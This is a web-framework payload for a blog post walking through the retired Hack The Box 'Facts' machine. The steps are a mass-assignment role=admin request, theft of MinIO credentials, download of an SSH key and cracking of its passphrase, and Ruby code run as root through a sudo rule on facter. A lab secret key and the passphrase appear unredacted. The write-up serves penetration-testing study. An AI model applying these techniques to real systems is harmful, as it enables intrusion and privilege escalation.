@@ -1,0 +1,242 @@
+1:"$Sreact.fragment"
+2:I[2509,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],""]
+3:I[6621,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],"MobileNavigation"]
+f:I[6025,[],"OutletBoundary"]
+10:"$Sreact.suspense"
+:HL["/writing/covers/hackthebox-facts-walkthrough.webp","image"]
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","a","/research",{"href":"/research","children":"Research"}],["$","a","/services",{"href":"/services","children":"Services"}],["$","a","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","a","/projects",{"href":"/projects","children":"Projects"}],["$","a","/about",{"href":"/about","children":"About"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an enquiry ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Facts Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box Facts machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T15:19:18.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[6," minutes"]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-facts-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Facts machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Facts machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/facts","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/3d9cc93c20e06c8958393cf8710569f1bd19279b/HTB-Facts.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep"," · 3d9cc93c20e0",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Facts"," · Linux"," · Medium"," · Retired status verified 12 Jul 2026","."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/facts","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ","$L4"]}]]}],["$L5","$L6","$L7"]]}],"$L8"]}]]}],"$L9"]}],"$La","$Lb"],null,"$Lc"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"65jXSdzueZKnFbMeYrtpi"}
+4:["$","span",null,{"aria-hidden":"true","children":"↗"}]
+5:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box Facts machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
+6:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
+7:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"2 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
+d:T2a1a,
+<p><strong>Difficulty:</strong> Medium<br /><strong>OS:</strong> Linux (Ubuntu 25.04)<br /><strong>Flags:</strong> <code>/home/william/flag.txt</code> (user), <code>/root/root.txt</code> (root)</p>
+<hr />
+<h2 id="attack-chain-overview">Attack Chain Overview</h2>
+<pre><code>Mass Assignment (role escalation) → MinIO creds leak → SSH key from MinIO bucket → SSH brute (john) → facter sudo abuse → Root
+</code></pre>
+<hr />
+<h2 id="step-1-privilege-escalation-on-the-web-app-mass-assignment">Step 1 — Privilege Escalation on the Web App (Mass Assignment)</h2>
+<h3 id="what-to-do">What to do</h3>
+<ol>
+<li>Log in to the Facts web app with any valid user account</li>
+<li>Go to <code>http://facts.htb/admin/profile/edit</code></li>
+<li>Click <strong>Change Password</strong> and fill in any new password</li>
+<li>Intercept the request with Burp Suite before it is sent</li>
+<li>Append the following to the end of the POST body:<pre><code>&amp;password%5Brole%5D=admin
+</code></pre>
+</li>
+<li>Forward the request, then refresh the admin panel</li>
+</ol>
+<p>The final request body should look like:</p>
+<pre><code>_method=patch&amp;authenticity_token=&lt;TOKEN&gt;&amp;password%5Bpassword%5D=newpass&amp;password%5Bpassword_confirmation%5D=newpass&amp;password%5Brole%5D=admin
+</code></pre>
+<h3 id="why-this-works">Why this works</h3>
+<p>This is a <strong>Mass Assignment vulnerability</strong>. The web framework (Ruby on Rails style) blindly accepts any parameter that maps to a model attribute. The <code>role</code> field is a database column but not protected from user input, so we can set our own role to <code>admin</code> just by adding it to the request. The server doesn't validate whether the user is allowed to change their own role.</p>
+<hr />
+<h2 id="step-2-extract-minio-credentials-from-admin-panel">Step 2 — Extract MinIO Credentials from Admin Panel</h2>
+<h3 id="what-to-do-2">What to do</h3>
+<ol>
+<li>Navigate to <strong>Settings → General Site → Filesystem Settings</strong></li>
+<li>Note down:<ul>
+<li><strong>AWS S3 Access Key</strong> (this is the MinIO access key)</li>
+<li><strong>AWS S3 Secret Key</strong> (this is the MinIO secret key)</li>
+<li><strong>Endpoint:</strong> <code>http://localhost:54321</code> (exposed externally as <code>http://facts.htb:54321</code>)</li>
+</ul>
+</li>
+</ol>
+<h3 id="why-this-works-2">Why this works</h3>
+<p>The Facts app uses MinIO (a self-hosted S3-compatible object storage server) for file storage. The admin panel exposes the raw credentials in plaintext in the settings page. These credentials give us full read/write access to the MinIO buckets.</p>
+<hr />
+<h2 id="step-3-install-the-minio-client-mc">Step 3 — Install the MinIO Client (<code>mc</code>)</h2>
+<h3 id="what-to-do-3">What to do</h3>
+<pre><code class="language-bash" data-language="bash"># For ARM64 Kali (adjust arch if needed)
+curl -O https://dl.min.io/client/mc/release/linux-arm64/mc
+chmod +x mc
+sudo mv mc /usr/local/bin/mc
+mc --version
+</code></pre>
+<blockquote>
+<p> <strong>Note:</strong> On some Kali systems, <code>mc</code> is already taken by Midnight Commander. The MinIO client binary may be renamed <code>midnightcommander</code> automatically. Check with <code>which mc</code> and <code>mc --version</code>.</p>
+</blockquote>
+<h3 id="why-this-works-3">Why this works</h3>
+<p>The <code>mc</code> (MinIO Client) is the official CLI tool to interact with MinIO/S3 buckets. We need it to browse and download files from the server.</p>
+<hr />
+<h2 id="step-4-connect-to-minio-and-list-buckets">Step 4 — Connect to MinIO and List Buckets</h2>
+<h3 id="what-to-do-4">What to do</h3>
+<pre><code class="language-bash" data-language="bash"># Replace with actual keys from Step 2
+midnightcommander alias set facts http://facts.htb:54321 '[redacted retired-lab access key]' 'IouE+2mCrqWZ+aw+Tod69eCGQO5HnuWsFxFfkP4H'
+
+midnightcommander ls facts/
+</code></pre>
+<p>Expected output:</p>
+<pre><code>[2025-xx-xx] 0B internal/
+[2025-xx-xx] 0B randomfacts/
+</code></pre>
+<h3 id="why-this-works-4">Why this works</h3>
+<p>We set a local alias called <code>facts</code> pointing to the MinIO server with our stolen credentials. The <code>ls</code> command lists all buckets we have access to. The <code>internal/</code> bucket is suspicious — it likely contains sensitive data not meant to be public.</p>
+<hr />
+<h2 id="step-5-download-the-ssh-private-key">Step 5 — Download the SSH Private Key</h2>
+<h3 id="what-to-do-5">What to do</h3>
+<pre><code class="language-bash" data-language="bash">midnightcommander get facts/internal/.ssh/id_ed25519 ./id_ed25519
+</code></pre>
+<h3 id="why-this-works-5">Why this works</h3>
+<p>Someone stored an SSH private key inside the MinIO <code>internal</code> bucket (specifically in a <code>.ssh/</code> folder). This is a serious misconfiguration — private keys should never be stored in object storage. Since we have read access to the bucket, we can simply download it.</p>
+<hr />
+<h2 id="step-6-crack-the-ssh-key-passphrase">Step 6 — Crack the SSH Key Passphrase</h2>
+<h3 id="what-to-do-6">What to do</h3>
+<pre><code class="language-bash" data-language="bash"># Convert key to john-crackable format
+ssh2john ./id_ed25519 &gt; id.hash
+
+# Crack with rockyou
+john --wordlist=/usr/share/wordlists/rockyou.txt id.hash
+
+# Show the result
+john --show id.hash
+</code></pre>
+<p>Result: <strong><code>dragonballz</code></strong></p>
+<h3 id="why-this-works-6">Why this works</h3>
+<p>The SSH key is passphrase-protected, so we can't use it directly. <code>ssh2john</code> extracts the encrypted hash from the key file into a format John the Ripper can crack. Since the passphrase is a weak dictionary word (<code>dragonballz</code>), rockyou.txt finds it quickly.</p>
+<hr />
+<h2 id="step-7-identify-the-username">Step 7 — Identify the Username</h2>
+<p>The key has the comment <code>trivia@facts.htb</code> embedded in it (visible when you ran <code>ssh-keygen -p</code> or inspected the key). This tells us the username is <strong><code>trivia</code></strong>.</p>
+<p>You can also check with:</p>
+<pre><code class="language-bash" data-language="bash">ssh-keygen -l -f ./id_ed25519
+# or
+cat ./id_ed25519.pub  # if pub key exists
+</code></pre>
+<hr />
+<h2 id="step-8-ssh-into-the-server">Step 8 — SSH into the Server</h2>
+<h3 id="what-to-do-7">What to do</h3>
+<pre><code class="language-bash" data-language="bash">chmod 600 ./id_ed25519
+ssh trivia@facts.htb -i ./id_ed25519
+# Enter passphrase: dragonballz
+</code></pre>
+<h3 id="why-this-works-7">Why this works</h3>
+<p><code>chmod 600</code> is required because SSH refuses to use private key files that are world-readable (it's a security check). Once inside, we land as user <code>trivia</code>.</p>
+<hr />
+<h2 id="step-9-grab-the-user-flag">Step 9 — Grab the User Flag</h2>
+<pre><code class="language-bash" data-language="bash">cat /home/william/user.txt
+# 9d7d660[redacted]5d5beb3c5
+</code></pre>
+<blockquote>
+<p>The flag is in william's home directory, readable by trivia.</p>
+</blockquote>
+<hr />
+<h2 id="step-10-privilege-escalation-via-facter-sudo-abuse">Step 10 — Privilege Escalation via <code>facter</code> (Sudo Abuse)</h2>
+<h3 id="what-to-do-8">What to do</h3>
+<pre><code class="language-bash" data-language="bash"># Check sudo permissions
+sudo -l
+# Output: (ALL) NOPASSWD: /usr/bin/facter
+</code></pre>
+<p><code>facter</code> is a system inventory tool used by Puppet. It supports loading <strong>custom Ruby fact scripts</strong> from a directory via <code>--custom-dir</code>. Since it runs as root, any Ruby code in that directory runs as root too.</p>
+<pre><code class="language-bash" data-language="bash">mkdir -p /tmp/piv
+
+# Read root flag
+echo 'puts File.read("/root/root.txt")' &gt; /tmp/piv/a.rb
+sudo /usr/bin/facter --custom-dir=/tmp/piv
+
+# Read william's flag
+echo 'puts File.read("/home/william/flag.txt")' &gt; /tmp/piv/a.rb
+sudo /usr/bin/facter --custom-dir=/tmp/piv
+</code></pre>
+<h3 id="why-this-works-8">Why this works</h3>
+<p><code>facter --custom-dir</code> tells facter to load and <strong>execute</strong> any <code>.rb</code> (Ruby) files in that directory as part of collecting system facts. Since sudo runs facter as root with no password required, our Ruby code runs as root. We use <code>File.read()</code> to read any file on the system.</p>
+<blockquote>
+<p> <strong>Note:</strong> <code>use_pty</code> in the sudoers config prevents getting an interactive root shell via <code>exec "/bin/sh"</code>. File read via Ruby is the workaround.</p>
+</blockquote>
+<hr />
+<h2 id="flags">Flags</h2>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Location</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>User</td>
+<td><code>/home/william/user.txt</code></td>
+<td><code>9d7d660c[redacted]5beb3c5</code></td>
+</tr>
+<tr>
+<td>Root</td>
+<td><code>/root/root.txt</code></td>
+<td><code>3364fd2[redacted]e83f1690</code></td>
+</tr>
+</tbody></table>
+<hr />
+<h2 id="credentials-and-artifacts">Credentials &amp; Artifacts</h2>
+<table>
+<thead>
+<tr>
+<th>Item</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MinIO Access Key</td>
+<td><code>[redacted retired-lab access key]</code></td>
+</tr>
+<tr>
+<td>MinIO Secret Key</td>
+<td><code>IouE+2mCrqWZ+aw+Tod69eCGQO5HnuWsFxFfkP4H</code></td>
+</tr>
+<tr>
+<td>MinIO Endpoint</td>
+<td><code>http://facts.htb:54321</code></td>
+</tr>
+<tr>
+<td>SSH Key Passphrase</td>
+<td><code>dragonballz</code></td>
+</tr>
+<tr>
+<td>SSH User</td>
+<td><code>trivia</code></td>
+</tr>
+</tbody></table>
+<hr />
+<h2 id="key-vulnerabilities-and-lessons">Key Vulnerabilities &amp; Lessons</h2>
+<table>
+<thead>
+<tr>
+<th>Vulnerability</th>
+<th>Explanation</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Mass Assignment</strong></td>
+<td>Web framework accepted <code>role=admin</code> from user-controlled input because the field wasn't protected</td>
+</tr>
+<tr>
+<td><strong>Credentials in Admin UI</strong></td>
+<td>MinIO secret keys stored and displayed in plaintext in settings</td>
+</tr>
+<tr>
+<td><strong>Sensitive files in object storage</strong></td>
+<td>SSH private key stored in a MinIO bucket — never put keys in S3/MinIO</td>
+</tr>
+<tr>
+<td><strong>Weak passphrase</strong></td>
+<td>SSH key passphrase was in rockyou.txt</td>
+</tr>
+<tr>
+<td><strong>Insecure sudo rule</strong></td>
+<td><code>facter</code> allowed with <code>--custom-dir</code> means arbitrary Ruby execution as root</td>
+</tr>
+</tbody></table>
+<hr />
+<h2 id="tools-used">Tools Used</h2>
+<ul>
+<li><strong>Burp Suite</strong> — intercept and modify the mass assignment request</li>
+<li><strong>MinIO Client (<code>mc</code>)</strong> — browse and download from MinIO buckets</li>
+<li><strong>ssh2john + john</strong> — crack SSH key passphrase</li>
+<li><strong>facter</strong> — sudo-abused for root file read via custom Ruby facts</li>
+</ul>
+8:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$d"}}]
+9:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-encoding-walkthrough","children":[["$","span",null,{"children":"Newer article"}],["$","strong",null,{"children":"Hack The Box: Encoding Walkthrough"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",114," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-falafel-walkthrough","children":[["$","span",null,{"children":"Older article"}],["$","strong",null,{"children":"Hack The Box: Falafel Walkthrough"}]]}]}]]}]
+a:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Public profiles","children":[["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Hack The Box",{"href":"https://app.hackthebox.com/public/users/349278","target":"_blank","rel":"noreferrer","children":["Hack The Box"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credential wallet",{"href":"https://www.credential.net/profile/cyberkareem/wallet","target":"_blank","rel":"noreferrer","children":["Credential wallet"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credly",{"href":"https://www.credly.com/users/cyberkareem/badges","target":"_blank","rel":"noreferrer","children":["Credly"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Evidence-led research · authorized assessment"}],["$","$L2",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
+e:T50d,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-facts-walkthrough/#article","headline":"Hack The Box: Facts Walkthrough","description":"An archived walkthrough of the retired Hack The Box Facts machine, preserved from Abdullah Kareem's OSWE Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-facts-walkthrough/","datePublished":"2026-06-11T15:19:18.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":1015,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/3d9cc93c20e06c8958393cf8710569f1bd19279b/HTB-Facts.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-facts-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-facts-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Facts Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-facts-walkthrough/"}]}]}b:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$e"}}]
+c:["$","$Lf",null,{"children":["$","$10",null,{"name":"Next.MetadataOutlet","children":"$@11"}]}]
+11:null
